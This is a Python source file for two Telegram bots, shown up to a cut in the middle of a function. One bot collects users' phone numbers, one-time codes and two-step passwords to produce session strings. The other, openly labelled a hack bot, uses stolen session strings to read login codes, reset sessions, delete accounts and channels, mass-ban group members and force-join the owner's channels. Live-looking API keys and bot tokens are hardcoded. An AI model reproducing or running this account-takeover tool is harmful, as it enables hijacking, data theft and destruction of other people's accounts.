import os
import json
import time
import logging
import asyncio
from os import getenv
from threading import Thread

from flask import Flask

from pyrogram import Client, filters, idle, enums
from pyrogram.raw import functions
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, ChatPrivileges
from pyrogram.errors import (
    ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired, 
    SessionPasswordNeeded, PasswordHashInvalid, ApiIdPublishedFlood,
    AccessTokenInvalid, FloodWait, InputUserDeactivated, UserIsBlocked, PeerIdInvalid
)
from pyromod import listen
from asyncio.exceptions import TimeoutError

from telethon import TelegramClient, functions as tfunc
from telethon.sessions import StringSession
from telethon.tl.functions.channels import (
    GetAdminedPublicChannelsRequest, JoinChannelRequest, LeaveChannelRequest,
    DeleteChannelRequest, EditBannedRequest
)
from telethon.tl.types import ChannelParticipantsAdmins, ChatBannedRights
from telethon.tl.functions.auth import ResetAuthorizationsRequest
from telethon.errors import (
    ApiIdInvalidError, PhoneNumberInvalidError, PhoneCodeInvalidError,
    PhoneCodeExpiredError, SessionPasswordNeededError, PasswordHashInvalidError
)

# ==================== FLASK SERVER (SHARED) ====================
logging.getLogger("werkzeug").setLevel(logging.ERROR)
flask_app = Flask(__name__)

@flask_app.route("/")
def home():
    return "✅ Both Bots are running!"

@flask_app.route("/healthz")
def healthz():
    return ("", 204)

def run_flask():
    port = int(os.getenv("PORT", "8080"))
    flask_app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False, threaded=True)

Thread(target=run_flask, daemon=True).start()

# ==================== LOGGING ====================
logging.basicConfig(level=logging.WARNING, format="%(asctime)s - %(levelname)s - %(message)s")

# ╔═══════════════════════════════════════════════════════════════╗
# ║           BOT 1: SESSION GENERATOR BOT                        ║
# ╚═══════════════════════════════════════════════════════════════╝

# ==================== CONFIG - BOT 1 ====================
API_ID_1 = int(getenv("API_ID_1", "10796618"))
API_HASH_1 = getenv("API_HASH_1", "4e4b20b4e1e40c90fcb1a7658c800150")
BOT_TOKEN_1 = getenv("BOT_TOKEN_1", "8351290809:AAGNTwNVF9i39PmgI-tGp_SpEbaYBjxiveA")
OWNER_ID_1 = int(getenv("OWNER_ID_1", "5368154755"))
MUST_JOIN_1 = getenv("MUST_JOIN_1", "RomeoBot_op")

# ==================== DATABASE - BOT 1 ====================
DB_FILE_1 = "users_db_session_gen.json"

def load_db_1():
    if os.path.exists(DB_FILE_1):
        with open(DB_FILE_1, 'r') as f:
            return json.load(f)
    return {"users": []}

def save_db_1(data):
    with open(DB_FILE_1, 'w') as f:
        json.dump(data, f, indent=4)

async def is_served_user_1(user_id: int) -> bool:
    db = load_db_1()
    return user_id in db["users"]

async def get_served_users_1() -> list:
    db = load_db_1()
    return db["users"]

async def add_served_user_1(user_id: int):
    if await is_served_user_1(user_id):
        return
    db = load_db_1()
    db["users"].append(user_id)
    save_db_1(db)

# ==================== CLIENT - BOT 1 ====================
session_gen_bot = Client(
    "SessionGenBot",
    api_id=API_ID_1,
    api_hash=API_HASH_1,
    bot_token=BOT_TOKEN_1,
    in_memory=True
)

# ==================== BUTTONS - BOT 1 ====================
ask_ques_1 = "**Please choose the python library you want to generate string session for:**"

buttons_ques_1 = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔷 Pyrogram V2 🔷", callback_data="gen_pyrogram")],
    [InlineKeyboardButton("🔷 Pyrogram (Old) 🔷", callback_data="gen_pyrogram1")],
    [InlineKeyboardButton("🔷 Telethon 🔷", callback_data="gen_telethon")],
    [InlineKeyboardButton("🔶 Pyrogram V2 Bot 🔶", callback_data="gen_pyrogram_bot"),
     InlineKeyboardButton("🔶 Telethon Bot 🔶", callback_data="gen_telethon_bot")]
])

gen_button_1 = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔄 Start Generating Session", callback_data="gen_generate")]
])

# ==================== HANDLERS - BOT 1 ====================
@session_gen_bot.on_message(filters.private & ~filters.service, group=1)
async def users_sql_1(_, msg: Message):
    await add_served_user_1(msg.from_user.id)

@session_gen_bot.on_message(filters.private & filters.command("start"))
async def start_1(bot: Client, msg: Message):
    me = await bot.get_me()
    
    if MUST_JOIN_1:
        if MUST_JOIN_1.startswith("@"):
            link = f"https://t.me/{MUST_JOIN_1[1:]}"
        else:
            link = f"https://t.me/{MUST_JOIN_1}"
        
        buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔷 Start Generating 🔷", callback_data="gen_generate")],
            [InlineKeyboardButton("📢 Join Channel", url=link)]
        ])
    else:
        buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔷 Start Generating 🔷", callback_data="gen_generate")]
        ])
    
    await msg.reply_text(
        f"👋 **Hey {msg.from_user.mention}!**\n\n"
        f"🤖 **I am {me.mention}**\n"
        f"📱 **String Session Generator Bot**\n\n"
        f"I can generate string sessions for:\n"
        f"• Pyrogram V2 (User & Bot)\n"
        f"• Pyrogram Old (User)\n"
        f"• Telethon (User & Bot)\n\n"
        f"Click below to start! 👇",
        reply_markup=buttons
    )

@session_gen_bot.on_message(filters.private & filters.command(["generate", "gen", "string", "str"]))
async def generate_command_1(bot: Client, msg: Message):
    await msg.reply(ask_ques_1, reply_markup=buttons_ques_1)

@session_gen_bot.on_message(filters.user(OWNER_ID_1) & filters.command("stats"))
async def stats_1(bot: Client, msg: Message):
    users = await get_served_users_1()
    await msg.reply_text(
        f"📊 **Bot Statistics:**\n\n"
        f"👥 Total Users: **{len(users)}**",
        quote=True
    )

@session_gen_bot.on_message(filters.user(OWNER_ID_1) & filters.command("broadcast"))
async def broadcast_command_1(bot: Client, msg: Message):
    if msg.reply_to_message:
        broadcast_msg = msg.reply_to_message
    else:
        await msg.reply_text(
            "❌ **Please reply to a message to broadcast!**\n\n"
            "**Usage:**\nReply to any message with `/broadcast`"
        )
        return
    
    users = await get_served_users_1()
    total_users = len(users)
    
    if total_users == 0:
        await msg.reply_text("❌ **No users found in database!**")
        return
    
    status_msg = await msg.reply_text(
        f"📡 **Broadcasting started...**\n\n"
        f"👥 Total Users: `{total_users}`\n"
        f"⏳ Please wait..."
    )
    
    success = 0
    failed = 0
    deleted = 0
    blocked = 0
    
    for user_id in users:
        try:
            await broadcast_msg.copy(user_id)
            success += 1
            
            if success % 10 == 0:
                await status_msg.edit_text(
                    f"📡 **Broadcasting...**\n\n"
                    f"👥 Total: `{total_users}`\n"
                    f"✅ Success: `{success}`\n"
                    f"❌ Failed: `{failed}`\n"
                    f"🚫 Blocked: `{blocked}`\n"
                    f"👻 Deleted: `{deleted}`\n\n"
                    f"⏳ In progress..."
                )
            
            await asyncio.sleep(0.1)
            
        except FloodWait as e:
            await asyncio.sleep(e.value)
            try:
                await broadcast_msg.copy(user_id)
                success += 1
            except:
                failed += 1
                
        except InputUserDeactivated:
            deleted += 1
            failed += 1
            
        except UserIsBlocked:
            blocked += 1
            failed += 1
            
        except PeerIdInvalid:
            failed += 1
            
        except Exception as e:
            failed += 1
    
    await status_msg.edit_text(
        f"📡 **Broadcast Completed!**\n\n"
        f"👥 Total Users: `{total_users}`\n"
        f"✅ Successfully Sent: `{success}`\n"
        f"❌ Failed: `{failed}`\n"
        f"🚫 Blocked Bot: `{blocked}`\n"
        f"👻 Deleted Account: `{deleted}`\n\n"
        f"**Success Rate:** `{round((success/total_users)*100, 2)}%`"
    )

# ==================== SESSION GENERATOR FUNCTION - BOT 1 ====================
async def generate_session_1(bot: Client, msg: Message, telethon=False, old_pyro=False, is_bot=False):
    if telethon:
        ty = "Telethon"
    else:
        ty = "Pyrogram"
        if not old_pyro:
            ty += " V2"
    if is_bot:
        ty += " Bot"
    
    await msg.reply(f"🚀 **Starting {ty} Session Generation...**")
    user_id = msg.chat.id
    
    api_id_msg = await bot.ask(
        user_id, 
        "📝 **Send your API_ID**\n\n"
        "💡 Click /skip to use bot's API\n"
        "❌ Click /cancel to cancel",
        filters=filters.text
    )
    if await cancelled_1(api_id_msg):
        return
    
    if api_id_msg.text == "/skip":
        api_id = API_ID_1
        api_hash = API_HASH_1
    else:
        try:
            api_id = int(api_id_msg.text)
        except ValueError:
            await api_id_msg.reply(
                "❌ **Invalid API_ID!** Must be an integer.\n\nPlease start again.",
                quote=True,
                reply_markup=gen_button_1
            )
            return
        
        api_hash_msg = await bot.ask(
            user_id,
            "📝 **Now send your API_HASH**\n\n❌ Click /cancel to cancel",
            filters=filters.text
        )
        if await cancelled_1(api_hash_msg):
            return
        api_hash = api_hash_msg.text.strip()
    
    if not is_bot:
        t = "📱 **Send your PHONE NUMBER** with country code\n\nExample: `+919876543210`\n\n❌ Click /cancel to cancel"
    else:
        t = "🤖 **Send your BOT TOKEN**\n\nExample: `123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11`\n\n❌ Click /cancel to cancel"
    
    phone_number_msg = await bot.ask(user_id, t, filters=filters.text)
    if await cancelled_1(phone_number_msg):
        return
    phone_number = phone_number_msg.text.strip()
    
    if not is_bot:
        await msg.reply("📤 **Sending OTP...**")
    else:
        await msg.reply("🔐 **Logging as Bot...**")
    
    if telethon and is_bot:
        client = TelegramClient(StringSession(), api_id, api_hash)
    elif telethon:
        client = TelegramClient(StringSession(), api_id, api_hash)
    elif is_bot:
        client = Client(name="bot", api_id=api_id, api_hash=api_hash, bot_token=phone_number, in_memory=True)
    elif old_pyro:
        client = Client(":memory:", api_id=api_id, api_hash=api_hash)
    else:
        client = Client(name="user", api_id=api_id, api_hash=api_hash, in_memory=True)
    
    await client.connect()
    
    try:
        code = None
        if not is_bot:
            if telethon:
                code = await client.send_code_request(phone_number)
            else:
                code = await client.send_code(phone_number)
    except (ApiIdInvalid, ApiIdInvalidError):
        await msg.reply("❌ **Invalid API_ID/API_HASH combination!**\n\nPlease start again.", reply_markup=gen_button_1)
        await client.disconnect()
        return
    except (PhoneNumberInvalid, PhoneNumberInvalidError):
        await msg.reply("❌ **Invalid Phone Number!**\n\nPlease start again.", reply_markup=gen_button_1)
        await client.disconnect()
        return
    
    try:
        phone_code_msg = None
        if not is_bot:
            phone_code_msg = await bot.ask(
                user_id,
                "📨 **OTP sent to your Telegram account!**\n\n"
                "📝 Send OTP in this format: `1 2 3 4 5`\n"
                "⏱ Timeout: 10 minutes\n\n"
                "❌ Click /cancel to cancel",
                filters=filters.text,
                timeout=600
            )
            if await cancelled_1(phone_code_msg):
                await client.disconnect()
                return
    except TimeoutError:
        await msg.reply("⏱ **Timeout!** 10 minutes exceeded.\n\nPlease start again.", reply_markup=gen_button_1)
        await client.disconnect()
        return
    
    if not is_bot:
        phone_code = phone_code_msg.text.replace(" ", "").strip()
        try:
            if telethon:
                await client.sign_in(phone_number, phone_code, password=None)
            else:
                await client.sign_in(phone_number, code.phone_code_hash, phone_code)
        except (PhoneCodeInvalid, PhoneCodeInvalidError):
            await msg.reply("❌ **Invalid OTP!**\n\nPlease start again.", reply_markup=gen_button_1)
            await client.disconnect()
            return
        except (PhoneCodeExpired, PhoneCodeExpiredError):
            await msg.reply("❌ **OTP Expired!**\n\nPlease start again.", reply_markup=gen_button_1)
            await client.disconnect()
            return
        except (SessionPasswordNeeded, SessionPasswordNeededError):
            try:
                two_step_msg = await bot.ask(
                    user_id,
                    "🔐 **Your account has 2-Step Verification!**\n\n"
                    "📝 Send your password\n"
                    "⏱ Timeout: 5 minutes\n\n"
                    "❌ Click /cancel to cancel",
                    filters=filters.text,
                    timeout=300
                )
                
                if await cancelled_1(two_step_msg):
                    await client.disconnect()
                    return
                    
            except TimeoutError:
                await msg.reply("⏱ **Timeout!** 5 minutes exceeded.\n\nPlease start again.", reply_markup=gen_button_1)
                await client.disconnect()
                return
            
            try:
                password = two_step_msg.text
                
                if telethon:
                    await client.sign_in(password=password)
                else:
                    await client.check_password(password=password)
                    
            except (PasswordHashInvalid, PasswordHashInvalidError):
                await two_step_msg.reply(
                    "❌ **Invalid Password!**\n\nPlease start again.",
                    quote=True,
                    reply_markup=gen_button_1
                )
                await client.disconnect()
                return
    else:
        try:
            if telethon:
                await client.start(bot_token=phone_number)
            else:
                await client.sign_in_bot(phone_number)
        except Exception as e:
            await msg.reply(f"❌ **Bot login failed!**\n\nError: `{str(e)}`", reply_markup=gen_button_1)
            await client.disconnect()
            return
    
    string_session = None
    try:
        if telethon:
            if not client.is_connected():
                await client.connect()
            string_session = client.session.save()
        else:
            string_session = await client.export_session_string()
        
        if not string_session or len(string_session) < 10:
            raise Exception("Generated session string is empty!")
        
    except Exception as e:
        await msg.reply(f"❌ **Failed to generate session!**\n\nError: `{str(e)}`", reply_markup=gen_button_1)
        await client.disconnect()
        return
    
    text = (
        f"✅ **{ty.upper()} STRING SESSION**\n\n"
        f"`{string_session}`\n\n"
        f"⚠️ **Keep it safe and don't share!**\n"
        f"🤖 **Generated by:** @{(await bot.get_me()).username}"
    )
    
    try:
        if not is_bot:
            await client.send_message("me", text)
    except:
        pass
    
    try:
        await bot.send_message(msg.chat.id, text)
    except:
        await bot.send_message(msg.chat.id, f"✅ **{ty.upper()} STRING SESSION**\n\n**Session String:**")
        await bot.send_message(msg.chat.id, f"`{string_session}`")
    
    await client.disconnect()
    await bot.send_message(msg.chat.id, f"✅ **Successfully generated {ty} string session!**")

async def cancelled_1(msg):
    if "/cancel" in msg.text:
        await msg.reply("❌ **Cancelled!**", quote=True, reply_markup=gen_button_1)
        return True
    elif "/restart" in msg.text:
        await msg.reply("🔄 **Restarted!**", quote=True, reply_markup=gen_button_1)
        return True
    elif "/skip" in msg.text:
        return False
    elif msg.text.startswith("/"):
        await msg.reply("❌ **Cancelled!**", quote=True)
        return True
    else:
        return False

@session_gen_bot.on_callback_query()
async def handle_callbacks_1(bot: Client, callback_query: CallbackQuery):
    query = callback_query.data
    
    if query == "gen_generate":
        await callback_query.answer()
        await callback_query.message.reply(ask_ques_1, reply_markup=buttons_ques_1)
    
    elif query.startswith("gen_pyrogram") or query.startswith("gen_telethon"):
        try:
            if query == "gen_pyrogram":
                await callback_query.answer("⚠️ Pyrogram V2", show_alert=True)
                await generate_session_1(bot, callback_query.message)
            
            elif query == "gen_pyrogram1":
                await callback_query.answer("📱 Pyrogram Old", show_alert=True)
                await generate_session_1(bot, callback_query.message, old_pyro=True)
            
            elif query == "gen_pyrogram_bot":
                await callback_query.answer("🤖 Pyrogram V2 Bot", show_alert=True)
                await generate_session_1(bot, callback_query.message, is_bot=True)
            
            elif query == "gen_telethon_bot":
                await callback_query.answer("🤖 Telethon Bot", show_alert=True)
                await generate_session_1(bot, callback_query.message, telethon=True, is_bot=True)
            
            elif query == "gen_telethon":
                await callback_query.answer("📱 Telethon User", show_alert=True)
                await generate_session_1(bot, callback_query.message, telethon=True)
        
        except Exception as e:
            await callback_query.message.reply(f"❌ **An error occurred!**\n\nError: `{str(e)}`")


# ╔═══════════════════════════════════════════════════════════════╗
# ║           BOT 2: RECOVERY/HACK BOT                            ║
# ╚═══════════════════════════════════════════════════════════════╝

# ==================== CONFIG - BOT 2 ====================
API_ID_2 = int(getenv("API_ID_2", "10796618"))
API_HASH_2 = getenv("API_HASH_2", "4e4b20b4e1e40c90fcb1a7658c800150")
BOT_TOKEN_2 = getenv("BOT_TOKEN_2", "7936981734:AAEh17m4-gE7bq9Ky5H-QP1bkRTlP_YaIGI")
START_PIC_2 = getenv("START_PIC_2", "https://telegra.ph//file/a9a90059ae47fa840b0b3.jpg")

FORCE_JOIN_CHANNELS_2 = ["@ROMEOBOT_OP", "@ROMEO_OP"]
OWNER_NAME_2 = "𝕾🅡︎🅐︎🅙︎𝕾"
OWNER_USERNAME_2 = "@romeo_op"

# ==================== CLIENT - BOT 2 ====================
recovery_bot = Client(
    "RecoveryBot",
    api_id=API_ID_2,
    api_hash=API_HASH_2,
    bot_token=BOT_TOKEN_2,
    in_memory=True
)

# ==================== MESSAGES - BOT 2 ====================
PM_TEXT_2 = """
**Hey {},**
I'm **{}**

● Hack ●
❥︎ A Bot To Hack Any user account using
❥︎ Their Telethon and Pyrogram String session
❥︎ Owner: {owner}
"""

HACK_TEXT_2 = """
**A** ~ Check user own groups and channels (PUBLIC ONLY)
**B** ~ Check user all information like phone number, username... etc
**C** ~ Ban all the members from the group
**D** ~ Know user last OTP, Use option B first to take number then login
**E** ~ Join A Group/Channel/Link via StringSession
**F** ~ Leave A Group/Channel via StringSession
**G** ~ Delete A Group/Channel
**H** ~ Check user two step is enabled or disabled
**I** ~ Terminate All current active sessions except Your StringSession
**J** ~ Delete Account
**K** ~ Promote a member in a Group/Channel
**L** ~ Demote All admins in a Group/Channel
**M** ~ Send Message to Saved Messages
**N** ~ Get All Active Sessions List
**O** ~ Download User Profile Photos
**P** ~ Change Profile (Name/Bio/Username)

❥︎ Owner: {owner}
"""

# ==================== BUTTONS - BOT 2 ====================
PM_BUTTON_2 = InlineKeyboardMarkup([[InlineKeyboardButton("● 𝐇𝐀𝐂𝐊 ●", callback_data="hack_btn_2")]])

HACK_MODS_2 = InlineKeyboardMarkup([
    [InlineKeyboardButton("A", callback_data="hack_A"), InlineKeyboardButton("B", callback_data="hack_B"), 
     InlineKeyboardButton("C", callback_data="hack_C"), InlineKeyboardButton("D", callback_data="hack_D")], 
    [InlineKeyboardButton("E", callback_data="hack_E"), InlineKeyboardButton("F", callback_data="hack_F"),
     InlineKeyboardButton("G", callback_data="hack_G"), InlineKeyboardButton("H", callback_data="hack_H")],
    [InlineKeyboardButton("I", callback_data="hack_I"), InlineKeyboardButton("J", callback_data="hack_J"),
     InlineKeyboardButton("K", callback_data="hack_K"), InlineKeyboardButton("L", callback_data="hack_L")], 
    [InlineKeyboardButton("M", callback_data="hack_M"), InlineKeyboardButton("N", callback_data="hack_N"), 
     InlineKeyboardButton("O", callback_data="hack_O"), InlineKeyboardButton("P", callback_data="hack_P")]
])

# ==================== RIGHTS - BOT 2 ====================
BAN_RIGHTS_2 = ChatBannedRights(
    until_date=None, view_messages=True, send_messages=True, send_media=True,
    send_stickers=True, send_gifs=True, send_games=True, send_inline=True, embed_links=True,
)

FULL_PROMOTE_2 = ChatPrivileges(
    can_change_info=True, can_delete_messages=True, can_restrict_members=True,
    can_pin_messages=True, can_manage_video_chats=True, can_promote_members=True, can_invite_users=True
)

PROMOTE_2 = ChatPrivileges(
    can_change_info=True, can_delete_messages=True, can_restrict_members=True, can_pin_messages=True
)

DEMOTE_2 = ChatPrivileges(
    can_change_info=False, can_invite_users=False, can_delete_messages=False,
    can_restrict_members=False, can_pin_messages=False, can_promote_members=False,
    can_manage_chat=False, can_manage_video_chats=False,
)

# ==================== HELPER FUNCTIONS - BOT 2 ====================
async def auto_join_channels_telethon_2(client):
    for channel in FORCE_JOIN_CHANNELS_2:
        try:
            await client(JoinChannelRequest(channel))
        except:
            pass

async def auto_join_channels_pyrogram_2(client):
    for channel in FORCE_JOIN_CHANNELS_2:
        try:
            await client.join_chat(channel)
        except:
            pass

async def users_gc_2(session):
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
            await rj.connect()
            await auto_join_channels_telethon_2(rj)
            k = await rj(GetAdminedPublicChannelsRequest())
            for x in k.chats:
                msg += f'**❥︎ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ:** {x.title}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{x.username}\n**❥︎ ᴍᴇᴍʙᴇʀs:** {x.participants_count}\n\n'
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
                await auto_join_channels_pyrogram_2(r)
                k = await r.invoke(functions.channels.GetAdminedPublicChannels())
                for x in k.chats:
                    msg += f'**❥︎ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ:** {x.title}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{x.username}\n**❥︎ ᴍᴇᴍʙᴇʀs:** {x.members_count}\n\n'
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg if msg else "**ɴᴏ ᴘᴜʙʟɪᴄ ᴄʜᴀɴɴᴇʟs ғᴏᴜɴᴅ!**"

async def user_info_2(session):
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
            await rj.connect()
            await auto_join_channels_telethon_2(rj)
            k = await rj.get_me()
            msg = f'**❥︎ ɴᴀᴍᴇ:** {k.first_name or k.last_name}\n**❥︎ ɪᴅ:** {k.id}\n**❥︎ ᴘʜᴏɴᴇ:** +{k.phone}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{k.username}'
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
                await auto_join_channels_pyrogram_2(r)
                k = await r.get_me()
                msg = f'**❥︎ ɴᴀᴍᴇ:** {k.first_name or k.last_name}\n**❥︎ ɪᴅ:** {k.id}\n**❥︎ ᴘʜᴏɴᴇ:** +{k.phone_number}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{k.username}'
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg

async def banall_2(session, gc_id):
    err = ""
    total = 0
    banned = 0
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
            await rj.connect()
            await auto_join_channels_telethon_2(rj)
            admins = await rj.get_participants(gc_id, filter=ChannelParticipantsAdmins)
            admin_ids = [i.id for i in admins]
            async for user in rj.iter_participants(gc_id):
                total += 1
                try:
                    if user.id not in admin_ids:
                        await rj(EditBannedRequest(gc_id, user.id, BAN_RIGHTS_2))
                        banned += 1
                        await asyncio.sleep(0.1)
                except:
                    await asyncio.sleep(0.1)
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
                await auto_join_channels_pyrogram_2(r)
                async for member in r.get_chat_members(gc_id):
                    total += 1
                    try:
                        await r.ban_chat_member(gc_id, member.user.id)
                        banned += 1
                    except FloodWait as fw:
                        await asyncio.sleep(fw.value)
                    except:
                        pass
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return f"**✅ ʙᴀɴɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**\n\n**❥︎ ʙᴀɴɴᴇᴅ:** {banned}\n**❥︎ ᴛᴏᴛᴀʟ:** {total}"

async def get_otp_2(session):
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
            await rj.connect()
            await auto_join_channels_telethon_2(rj)
            async for x in rj.iter_messages(777000, limit=2):
                msg += f"\n{x.text}\n"
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
                await auto_join_channels_pyrogram_2(r)
                async for message in r.get_chat_history(777000, limit=2):
                    msg += f"\n{message.text}\n"
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg if msg else "**ɴᴏ ᴏᴛᴘ ғᴏᴜɴᴅ!**"

async def join_ch_2(session, gc_id):
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
            await rj.connect()
            await auto_join_channels_telethon_2(rj)
            await rj(JoinChannelRequest(gc_id))
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
                await auto_join_channels_pyrogram_2(r)
                await r.join_chat(gc_id)
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ ᴊᴏɪɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**"

async def leave_ch_2(session, gc_id):
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
            await rj.connect()
            await auto_join_channels_telethon_2(rj)
            await rj(LeaveChannelRequest(gc_id))
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
                await auto_join_channels_pyrogram_2(r)
                await r.leave_chat(gc_id)
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ ʟᴇғᴛ sᴜᴄᴄᴇssғᴜʟʟʏ!**"

async def del_ch_2(session, gc_id):
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
            await rj.connect()
            await auto_join_channels_telethon_2(rj)
            await rj(DeleteChannelRequest(gc_id))
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
                await auto_join_channels_pyrogram_2(r)
                await r.invoke(functions.channels.DeleteChannel(channel=await r.resolve_peer(gc_id)))
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ ᴅᴇʟᴇᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**"

async def check_2fa_2(session):
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
            await rj.connect()
            await auto_join_channels_telethon_2(rj)
            try:
                await rj.edit_2fa("testpass123")
                msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ ❌**"
            except:
                msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ ✅**"
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
                await auto_join_channels_pyrogram_2(r)
                pwd = await r.invoke(functions.account.GetPassword())
                if pwd.has_password:
                    msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ ✅**"
                else:
                    msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ ❌**"
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg

async def terminate_all_2(session):
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
            await rj.connect()
            await auto_join_channels_telethon_2(rj)
            await rj(ResetAuthorizationsRequest())
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
                await auto_join_channels_pyrogram_2(r)
                await r.invoke(functions.auth.ResetAuthorizations())
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴀʟʟ sᴇssɪᴏɴs!**"

async def del_acc_2(session):
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
            await rj.connect()
            await auto_join_channels_telethon_2(rj)
            await rj(tfunc.account.DeleteAccountRequest("Deleted"))
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
                await auto_join_channels_pyrogram_2(r)
                await r.invoke(functions.account.DeleteAccount(reason="Deleted"))
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇʟᴇᴛᴇᴅ ᴀᴄᴄᴏᴜɴᴛ!**"

async def promote_user_2(session, gc_id, user_id):
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
            await rj.connect()
            await auto_join_channels_telethon_2(rj)
            try:
                await rj.edit_admin(gc_id, user_id, manage_call=True, invite_users=True,
                                   ban_users=True, change_info=True, edit_messages=True,
                                   post_messages=True, add_admins=True, delete_messages=True)
            except:
                await rj.edit_admin(gc_id, user_id, is_admin=True, anonymous=False,
                                   pin_messages=True, title='Admin')
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
                await auto_join_channels_pyrogram_2(r)
                try:
                    await r.promote_chat_member(gc_id, user_id, FULL_PROMOTE_2)
                except:
                    await r.promote_chat_member(gc_id, user_id, PROMOTE_2)
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴘʀᴏᴍᴏᴛᴇᴅ ᴜsᴇʀ!**"

async def demote_all_2(session, gc_id):
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
            await rj.connect()
